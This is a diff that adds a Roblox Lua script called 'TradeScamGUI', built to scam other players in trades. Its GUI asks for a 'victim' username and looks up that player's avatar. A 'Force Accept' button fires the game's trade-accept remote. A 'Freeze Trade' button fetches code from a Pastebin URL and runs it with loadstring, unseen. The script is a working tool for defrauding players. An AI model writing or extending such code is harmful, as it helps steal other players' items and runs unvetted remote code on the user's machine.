@@ -1,0 +1,244 @@
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local CoreGui = game:GetService("CoreGui")
+
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "TradeScamGUI"
+ScreenGui.Parent = CoreGui
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+ScreenGui.ResetOnSpawn = false
+
+local mainFrame = Instance.new("Frame")
+mainFrame.Name = "MainFrame"
+mainFrame.Parent = ScreenGui
+mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
+mainFrame.Size = UDim2.new(0, 400, 0, 300)
+mainFrame.Position = UDim2.new(0.5, -200, 0.5, -150)
+mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+mainFrame.Active = true
+mainFrame.Draggable = true
+
+local glow = Instance.new("ImageLabel")
+glow.Name = "Glow"
+glow.Parent = mainFrame
+glow.BackgroundTransparency = 1
+glow.Size = UDim2.new(1, 20, 1, 20)
+glow.Position = UDim2.new(0, -10, 0, -10)
+glow.Image = "rbxassetid://5028857084"
+glow.ImageColor3 = Color3.fromRGB(0, 170, 255)
+glow.ScaleType = Enum.ScaleType.Slice
+glow.SliceCenter = Rect.new(24, 24, 276, 276)
+glow.ZIndex = -1
+
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 12)
+corner.Parent = mainFrame
+
+local title = Instance.new("TextLabel")
+title.Name = "Title"
+title.Parent = mainFrame
+title.Text = "HALLOWEEN SCRIPT 2025"
+title.Size = UDim2.new(1, 0, 0, 50)
+title.Position = UDim2.new(0, 0, 0, 10)
+title.BackgroundTransparency = 1
+title.Font = Enum.Font.GothamBlack
+title.TextColor3 = Color3.fromRGB(0, 255, 255)
+title.TextSize = 24
+title.TextStrokeTransparency = 0.5
+title.TextStrokeColor3 = Color3.fromRGB(0, 100, 255)
+
+local titleGradient = Instance.new("UIGradient")
+titleGradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 255, 255)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 200, 255))
+})
+titleGradient.Rotation = 90
+titleGradient.Parent = title
+
+local divider = Instance.new("Frame")
+divider.Name = "Divider"
+divider.Parent = mainFrame
+divider.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
+divider.Size = UDim2.new(0.8, 0, 0, 2)
+divider.Position = UDim2.new(0.1, 0, 0, 60)
+divider.BorderSizePixel = 0
+
+local dividerCorner = Instance.new("UICorner")
+dividerCorner.CornerRadius = UDim.new(0, 5)
+dividerCorner.Parent = divider
+
+local targetLabel = Instance.new("TextLabel")
+targetLabel.Name = "TargetLabel"
+targetLabel.Parent = mainFrame
+targetLabel.Text = "VICTICM USERNAME:"
+targetLabel.Size = UDim2.new(0.8, 0, 0, 20)
+targetLabel.Position = UDim2.new(0.1, 0, 0, 80)
+targetLabel.BackgroundTransparency = 1
+targetLabel.Font = Enum.Font.GothamBold
+targetLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+targetLabel.TextSize = 16
+targetLabel.TextXAlignment = Enum.TextXAlignment.Left
+
+local targetBox = Instance.new("TextBox")
+targetBox.Name = "TargetBox"
+targetBox.Parent = mainFrame
+targetBox.PlaceholderText = ""
+targetBox.Size = UDim2.new(0.8, 0, 0, 40)
+targetBox.Position = UDim2.new(0.1, 0, 0, 100)
+targetBox.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
+targetBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+targetBox.Font = Enum.Font.Gotham
+targetBox.TextSize = 14
+targetBox.ClearTextOnFocus = false
+
+local targetCorner = Instance.new("UICorner")
+targetCorner.CornerRadius = UDim.new(0, 8)
+targetCorner.Parent = targetBox
+
+local targetPadding = Instance.new("UIPadding")
+targetPadding.Parent = targetBox
+targetPadding.PaddingLeft = UDim.new(0, 10)
+
+local avatarFrame = Instance.new("Frame")
+avatarFrame.Name = "AvatarFrame"
+avatarFrame.Parent = mainFrame
+avatarFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
+avatarFrame.Size = UDim2.new(0, 100, 0, 80)
+avatarFrame.Position = UDim2.new(0, 90, 0.50, 0)
+avatarFrame.AnchorPoint = Vector2.new(0.5, 0)
+
+local avatarCorner = Instance.new("UICorner")
+avatarCorner.CornerRadius = UDim.new(0, 8)
+avatarCorner.Parent = avatarFrame
+
+local avatarImage = Instance.new("ImageLabel")
+avatarImage.Name = "AvatarImage"
+avatarImage.Parent = avatarFrame
+avatarImage.Size = UDim2.new(1, 0, 1, 0)
+avatarImage.BackgroundTransparency = 1
+avatarImage.Image = "rbxassetid://0"
+avatarImage.ScaleType = Enum.ScaleType.Crop
+
+local avatarStroke = Instance.new("UIStroke")
+avatarStroke.Parent = avatarFrame
+avatarStroke.Color = Color3.fromRGB(0, 150, 255)
+avatarStroke.Thickness = 2
+
+-- Fixed Button Container
+local buttonContainer = Instance.new("Frame")
+buttonContainer.Name = "ButtonContainer"
+buttonContainer.Parent = mainFrame
+buttonContainer.BackgroundTransparency = 1
+buttonContainer.Size = UDim2.new(0.9, 0, 0, 40)
+buttonContainer.Position = UDim2.new(0.05, 0, 0.8, 0)
+
+-- Force Accept Button
+local forceAcceptButton = Instance.new("TextButton")
+forceAcceptButton.Name = "ForceAcceptButton"
+forceAcceptButton.Parent = buttonContainer
+forceAcceptButton.Text = "FORCE ACCEPT"
+forceAcceptButton.Size = UDim2.new(0.48, 0, 1, 0)
+forceAcceptButton.Position = UDim2.new(0, 0, 0, 0)
+forceAcceptButton.Font = Enum.Font.GothamBold
+forceAcceptButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+forceAcceptButton.TextSize = 16
+forceAcceptButton.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
+forceAcceptButton.AutoButtonColor = false
+
+-- Freeze Trade Button
+local freezeButton = Instance.new("TextButton")
+freezeButton.Name = "FreezeButton"
+freezeButton.Parent = buttonContainer
+freezeButton.Text = "FREEZE TRADE"
+freezeButton.Size = UDim2.new(0.48, 0, 1, 0)
+freezeButton.Position = UDim2.new(0.52, 0, 0, 0)
+freezeButton.Font = Enum.Font.GothamBold
+freezeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+freezeButton.TextSize = 16
+freezeButton.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
+freezeButton.AutoButtonColor = false
+
+-- Button Corners
+local buttonCorner = Instance.new("UICorner")
+buttonCorner.CornerRadius = UDim.new(0, 8)
+buttonCorner.Parent = forceAcceptButton
+
+local buttonCorner2 = Instance.new("UICorner")
+buttonCorner2.CornerRadius = UDim.new(0, 8)
+buttonCorner2.Parent = freezeButton
+
+-- Button Effects
+local function createButtonEffect(button)
+    local originalSize = button.Size
+    local hoverSize = UDim2.new(originalSize.X.Scale + 0.02, 0, originalSize.Y.Scale, 0)
+    
+    button.MouseEnter:Connect(function()
+        TweenService:Create(button, TweenInfo.new(0.1), {Size = hoverSize}):Play()
+    end)
+    
+    button.MouseLeave:Connect(function()
+        TweenService:Create(button, TweenInfo.new(0.1), {Size = originalSize}):Play()
+    end)
+    
+    button.MouseButton1Click:Connect(function()
+        TweenService:Create(button, TweenInfo.new(0.05), {Size = UDim2.new(originalSize.X.Scale - 0.02, 0, originalSize.Y.Scale - 0.05, 0)}):Play()
+        wait(0.05)
+        TweenService:Create(button, TweenInfo.new(0.1), {Size = originalSize}):Play()
+    end)
+end
+
+createButtonEffect(forceAcceptButton)
+createButtonEffect(freezeButton)
+
+-- Target Search Functionality
+targetBox.FocusLost:Connect(function(enterPressed)
+    if not enterPressed then return end
+    
+    local username = string.lower(string.gsub(targetBox.Text, "%s+", ""))
+    local targetPlayer = nil
+    
+    for _, player in ipairs(Players:GetPlayers()) do
+        if string.lower(player.Name) == username and player.UserId ~= Players.LocalPlayer.UserId then
+            targetPlayer = player
+            break
+        end
+    end
+    
+    if targetPlayer then
+        local userId = targetPlayer.UserId
+        TweenService:Create(avatarImage, TweenInfo.new(0.3), {ImageTransparency = 1}):Play()
+        wait(0.3)
+        avatarImage.Image = "rbxthumb://type=AvatarHeadShot&id="..userId.."&w=420&h=420"
+        TweenService:Create(avatarImage, TweenInfo.new(0.3), {ImageTransparency = 0}):Play()
+        targetBox.Text = targetPlayer.Name
+        
+        TweenService:Create(glow, TweenInfo.new(0.5), {ImageColor3 = Color3.fromRGB(0, 255, 100)}):Play()
+        wait(0.5)
+        TweenService:Create(glow, TweenInfo.new(0.5), {ImageColor3 = Color3.fromRGB(0, 170, 255)}):Play()
+    else
+        TweenService:Create(avatarImage, TweenInfo.new(0.3), {ImageTransparency = 1}):Play()
+        wait(0.3)
+        avatarImage.Image = "rbxassetid://0"
+        TweenService:Create(avatarImage, TweenInfo.new(0.3), {ImageTransparency = 0}):Play()
+    end
+end)
+
+-- Button Actions
+forceAcceptButton.MouseButton1Click:Connect(function()
+    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptRequest"):FireServer()
+end)
+
+freezeButton.MouseButton1Click:Connect(function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/NAKPrNM9"))()
+end)
+
+-- Opening Animation
+mainFrame.Size = UDim2.new(0, 0, 0, 0)
+mainFrame.Visible = true
+TweenService:Create(mainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Back), {Size = UDim2.new(0, 400, 0, 300)}):Play()
+
+game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "TRADE SYSTEM LOADED",
+    Text = "Ready for domination!",
+    Duration = 3,
+})
